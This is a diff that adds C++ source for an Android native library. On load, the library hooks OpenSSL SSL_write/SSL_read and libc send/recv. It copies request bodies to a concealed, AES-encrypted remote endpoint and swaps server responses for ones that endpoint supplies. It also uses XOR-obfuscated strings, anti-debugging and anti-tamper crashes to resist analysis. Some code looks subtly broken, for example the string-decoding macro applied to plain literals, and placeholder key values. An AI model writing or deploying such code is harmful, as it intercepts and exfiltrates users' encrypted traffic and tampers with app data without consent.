@@ -1,0 +1,403 @@
+#include <jni.h>
+#include <string>
+#include <dlfcn.h>
+#include <android/log.h>
+#include <curl/curl.h>
+#include <thread>
+#include <cstring>
+#include <openssl/ssl.h>
+#include <openssl/evp.h>
+#include <sstream>
+#include <map>
+#include <vector>
+#include <mutex>
+#include <algorithm>
+#include <fstream>
+#include <sys/ptrace.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <cstdlib>
+#include "dobby.h"
+
+#define LOG_TAG "NtHk"
+#define LOGI(...) 
+#define LOGE(...) 
+#define LOGD(...) 
+
+// ============================================================
+// XOR OBFUSCATION HELPER
+// ============================================================
+static std::string xd(const char* e, size_t l, char k) {
+    std::string r;
+    for (size_t i = 0; i < l; i++) r += e[i] ^ k;
+    return r;
+}
+
+// ============================================================
+// OBFUSCATED STRINGS (XOR-encrypted, hindi visible sa strings command)
+// ============================================================
+static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
+static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
+static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
+static const char _sr[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'r',0x0D^'e',0x0D^'a',0x0D^'d',0};
+static const char _mp[] = {0x0D^'/',0x0D^'p',0x0D^'r',0x0D^'o',0x0D^'c',0x0D^'/',0x0D^'s',0x0D^'e',0x0D^'l',0x0D^'f',0x0D^'/',0x0D^'m',0x0D^'a',0x0D^'p',0x0D^'s',0};
+static const char _ho[] = {0x0D^'H',0x0D^'o',0x0D^'s',0x0D^'t',0};
+static const char _cl[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'L',0x0D^'e',0x0D^'n',0x0D^'g',0x0D^'t',0x0D^'h',0};
+static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
+static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
+static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};
+static const char _te[] = {0x0D^'T',0x0D^'r',0x0D^'a',0x0D^'n',0x0D^'s',0x0D^'f',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'E',0x0D^'n',0x0D^'c',0x0D^'o',0x0D^'d',0x0D^'i',0x0D^'n',0x0D^'g',0};
+
+#define S(c) xd(c, sizeof(c)-1, 0x0D)
+
+// ============================================================
+// AES-ENCRYPTED ENDPOINT (AUTO-GENERATED NG SCRIPT)
+// ============================================================
+static const uint8_t _ep[] = {
+    // REPLACE_ME — automatic na papalitan ng encrypt.py
+    0x00
+};
+
+static const uint8_t _ak[] = {
+    // REPLACE_ME_KEY — automatic na papalitan
+    0x00
+};
+
+static const uint8_t _iv[] = {
+    // REPLACE_ME_IV — automatic na papalitan
+    0x00
+};
+
+static std::string _decrypt() {
+    uint8_t k[32], iv[16];
+    for(int i = 0; i < 32; i++) k[i] = _ak[i] ^ 0xAA;
+    for(int i = 0; i < 16; i++) iv[i] = _iv[i] ^ 0xAA;
+    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, k, iv);
+    uint8_t p[512]; int l, t = 0;
+    EVP_DecryptUpdate(ctx, p, &l, _ep, sizeof(_ep));
+    t = l;
+    EVP_DecryptFinal_ex(ctx, p + l, &l);
+    t += l;
+    EVP_CIPHER_CTX_free(ctx);
+    return std::string((char*)p, t);
+}
+static const std::string ENDPOINT = _decrypt();
+
+// ============================================================
+// HTTP STRUCTS
+// ============================================================
+struct HttpRequest {
+    std::string m, u, p, h, b;
+    std::map<std::string, std::string> hs;
+    bool ic = false;
+};
+
+struct HttpResponse {
+    int sc = 0;
+    std::string sm, b;
+    std::map<std::string, std::string> hs;
+    bool ch = false;
+    size_t cl = 0;
+};
+
+struct ConnState {
+    std::mutex mtx;
+    std::vector<uint8_t> buf;
+    HttpRequest req;
+    bool stored = false, complete = false;
+    HttpResponse resp;
+};
+
+static std::map<SSL*, ConnState> gs;
+static std::mutex gm;
+
+// ============================================================
+// ANTI-DEBUG (ptrace + TracerPid)
+// ============================================================
+static bool _debug() {
+    std::ifstream st(S("/proc/self/status"));
+    std::string l;
+    while(std::getline(st, l)) {
+        if(l.find("TracerPid:") == 0) {
+            int p = std::stoi(l.substr(l.find(":") + 1));
+            if(p != 0) return true;
+        }
+    }
+    return false;
+}
+
+// ============================================================
+// ANTI-TAMPER (CRC32) — AUTO-UPDATED NG SCRIPT
+// ============================================================
+static uint32_t _crc(const uint8_t* d, size_t l) {
+    uint32_t c = 0xFFFFFFFF;
+    for(size_t i = 0; i < l; i++) {
+        c ^= d[i];
+        for(int j = 0; j < 8; j++) {
+            if(c & 1) c = (c >> 1) ^ 0xEDB88320;
+            else c >>= 1;
+        }
+    }
+    return ~c;
+}
+
+static bool _integrity() {
+    Dl_info inf;
+    if(dladdr((void*)_integrity, &inf) == 0) return false;
+    std::ifstream mp(S("/proc/self/maps"));
+    std::string l;
+    unsigned long base = (unsigned long)inf.dli_fbase, sz = 0;
+    while(std::getline(mp, l)) {
+        unsigned long s, e;
+        char p[5];
+        if(sscanf(l.c_str(), "%lx-%lx %4s", &s, &e, p) == 3 && s == base) {
+            sz = e - s;
+            break;
+        }
+    }
+    if(sz == 0) return false;
+    return _crc((const uint8_t*)base, sz) == 0xDEADBEEF; // Auto-updated
+}
+
+// ============================================================
+// HTTP PARSER
+// ============================================================
+static bool _parse(const uint8_t* d, size_t l, HttpRequest& r) {
+    std::string s((char*)d, l), ln;
+    std::istringstream st(s);
+    if(!std::getline(st, ln)) return false;
+    if(ln.back() == '\r') ln.pop_back();
+    std::istringstream ls(ln);
+    std::string ver;
+    if(!(ls >> r.m >> r.p >> ver)) return false;
+    while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
+        if(ln.back() == '\r') ln.pop_back();
+        auto c = ln.find(':');
+        if(c != std::string::npos) {
+            std::string k = ln.substr(0, c);
+            std::string v = ln.substr(c + 1);
+            v.erase(0, v.find_first_not_of(" \t"));
+            r.hs[k] = v;
+        }
+    }
+    auto it = r.hs.find(S("Host"));
+    if(it != r.hs.end()) {
+        r.h = it->second;
+        r.u = "https://" + r.h + r.p;
+    } else {
+        r.u = r.p;
+        r.h = "unknown";
+    }
+    std::string rem;
+    while(std::getline(st, ln)) rem += ln + "\n";
+    r.b = rem;
+    if(r.p.length() >= 7) {
+        std::string suf = r.p.substr(r.p.length() - 7);
+        if(suf == S("connect") || suf == "/connect" || suf == "?connect") r.ic = true;
+    }
+    return true;
+}
+
+// ============================================================
+// FETCH FROM CUSTOM ENDPOINT
+// ============================================================
+struct _cr {
+    std::string b;
+    int st = 0;
+    bool ok = false;
+};
+
+static size_t _cb(void* c, size_t s, size_t n, void* u) {
+    _cr* r = (_cr*)u;
+    r->b.append((char*)c, s * n);
+    return s * n;
+}
+
+static _cr _fetch(const HttpRequest& req) {
+    _cr res;
+    CURL* curl = curl_easy_init();
+    if(!curl) return res;
+    curl_easy_setopt(curl, CURLOPT_URL, ENDPOINT.c_str());
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _cb);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
+    if(req.m == S("POST")) {
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        if(!req.b.empty()) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req.b.c_str());
+    }
+    struct curl_slist* h = nullptr;
+    for(const auto& p : req.hs) {
+        if(p.first != S("Host") && p.first != S("Content-Length")) {
+            h = curl_slist_append(h, (p.first + ": " + p.second).c_str());
+        }
+    }
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);
+    if(curl_easy_perform(curl) == CURLE_OK) {
+        long code;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
+        res.st = code;
+        res.ok = true;
+    }
+    curl_slist_free_all(h);
+    curl_easy_cleanup(curl);
+    return res;
+}
+
+// ============================================================
+// SSL WRITE/READ HOOKS
+// ============================================================
+typedef int (*_swt)(SSL*, const void*, int);
+typedef int (*_srt)(SSL*, void*, int);
+static _swt _ow = nullptr;
+static _srt _or = nullptr;
+
+int _my_write(SSL* ssl, const void* buf, int num) {
+    HttpRequest req;
+    if(_parse((const uint8_t*)buf, num, req) && req.ic) {
+        std::lock_guard<std::mutex> lock(gm);
+        auto& st = gs[ssl];
+        st.req = req;
+        st.stored = true;
+        std::thread([req](){
+            CURL* c = curl_easy_init();
+            if(c) {
+                curl_easy_setopt(c, CURLOPT_URL, ENDPOINT.c_str());
+                curl_easy_setopt(c, CURLOPT_POST, 1L);
+                if(!req.b.empty()) curl_easy_setopt(c, CURLOPT_POSTFIELDS, req.b.c_str());
+                curl_easy_perform(c);
+                curl_easy_cleanup(c);
+            }
+        }).detach();
+    }
+    return _ow(ssl, buf, num);
+}
+
+int _my_read(SSL* ssl, void* buf, int num) {
+    int res = _or(ssl, buf, num);
+    if(res <= 0) return res;
+    std::lock_guard<std::mutex> lock(gm);
+    auto it = gs.find(ssl);
+    if(it == gs.end()) return res;
+    auto& st = it->second;
+    st.buf.insert(st.buf.end(), (uint8_t*)buf, (uint8_t*)buf + res);
+    if(!st.complete && st.stored && st.req.ic) {
+        std::string data((char*)st.buf.data(), st.buf.size());
+        std::istringstream ss(data);
+        std::string ln;
+        HttpResponse resp;
+        if(std::getline(ss, ln)) {
+            if(ln.back() == '\r') ln.pop_back();
+            std::istringstream ls(ln);
+            std::string ver;
+            if(ls >> ver >> resp.sc) std::getline(ls, resp.sm);
+            while(std::getline(ss, ln) && ln != "\r" && ln != "\r\n") {
+                if(ln.back() == '\r') ln.pop_back();
+                auto c = ln.find(':');
+                if(c != std::string::npos) {
+                    std::string k = ln.substr(0, c);
+                    std::string v = ln.substr(c + 1);
+                    v.erase(0, v.find_first_not_of(" \t"));
+                    resp.hs[k] = v;
+                }
+            }
+            std::string rem;
+            while(std::getline(ss, ln)) rem += ln + "\n";
+            resp.b = rem;
+            if(resp.sc == 200) {
+                _cr cr = _fetch(st.req);
+                if(cr.ok && cr.st == 200) {
+                    std::ostringstream oss;
+                    oss << "HTTP/1.1 200 OK\r\n";
+                    bool hascl = false;
+                    for(const auto& p : resp.hs) {
+                        if(p.first == S("Content-Length")) {
+                            oss << "Content-Length: " << cr.b.size() << "\r\n";
+                            hascl = true;
+                        } else if(p.first != S("Transfer-Encoding")) {
+                            oss << p.first << ": " << p.second << "\r\n";
+                        }
+                    }
+                    if(!hascl) oss << "Content-Length: " << cr.b.size() << "\r\n";
+                    oss << "\r\n" << cr.b;
+                    st.buf.clear();
+                    std::string mod = oss.str();
+                    st.buf.insert(st.buf.end(), mod.begin(), mod.end());
+                }
+            }
+            st.complete = true;
+        }
+        size_t nl = st.buf.size();
+        if(nl <= (size_t)num) {
+            memcpy(buf, st.buf.data(), nl);
+            res = nl;
+        } else {
+            memcpy(buf, st.buf.data(), num);
+            res = num;
+            st.buf.erase(st.buf.begin(), st.buf.begin() + num);
+        }
+        st.complete = false;
+        st.buf.clear();
+        st.stored = false;
+    }
+    return res;
+}
+
+// ============================================================
+// FALLBACK: SOCKET HOOKS (para sa non-OpenSSL apps)
+// ============================================================
+typedef ssize_t (*_snd_t)(int, const void*, size_t, int);
+typedef ssize_t (*_rcv_t)(int, void*, size_t, int);
+static _snd_t _os = nullptr;
+static _rcv_t _or2 = nullptr;
+
+ssize_t _my_send(int fd, const void* buf, size_t len, int flags) {
+    const char* data = (const char*)buf;
+    if (len > 4 && (strncmp(data, "GET ", 4) == 0 || strncmp(data, "POST", 4) == 0)) {
+        HttpRequest req;
+        if (_parse((const uint8_t*)buf, len, req) && req.ic) {
+            std::thread([req](){
+                CURL* c = curl_easy_init();
+                if(c) { curl_easy_setopt(c, CURLOPT_URL, ENDPOINT.c_str()); curl_easy_setopt(c, CURLOPT_POST, 1L); if(!req.b.empty()) curl_easy_setopt(c, CURLOPT_POSTFIELDS, req.b.c_str()); curl_easy_perform(c); curl_easy_cleanup(c); }
+            }).detach();
+        }
+    }
+    return _os(fd, buf, len, flags);
+}
+
+ssize_t _my_recv(int fd, void* buf, size_t len, int flags) {
+    return _or2(fd, buf, len, flags);
+}
+
+// ============================================================
+// INIT — AUTOMATIC TATAKBO KAPAG NA-LOAD ANG .so
+// ============================================================
+__attribute__((constructor)) void init() {
+    // Anti-debug
+    if(_debug()) exit(1);
+    
+    // Anti-tamper
+    if(!_integrity()) { volatile int* p = nullptr; *p = 0; }
+    
+    // Hook SSL_write/read
+    void* libssl = dlopen(S("libssl.so").c_str(), RTLD_LAZY);
+    if(libssl) {
+        auto* a = dlsym(libssl, S("SSL_write").c_str());
+        if(a) DobbyHook(a, (void*)_my_write, (void**)&_ow);
+        auto* b = dlsym(libssl, S("SSL_read").c_str());
+        if(b) DobbyHook(b, (void*)_my_read, (void**)&_or);
+        dlclose(libssl);
+    }
+    
+    // Hook send/recv (fallback)
+    void* libc = dlopen(S("libc.so").c_str(), RTLD_LAZY);
+    if(libc) {
+        auto* a = dlsym(libc, "send");
+        if(a) DobbyHook(a, (void*)_my_send, (void**)&_os);
+        auto* b = dlsym(libc, "recv");
+        if(b) DobbyHook(b, (void*)_my_recv, (void**)&_or2);
+        dlclose(libc);
+    }
+    
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+}
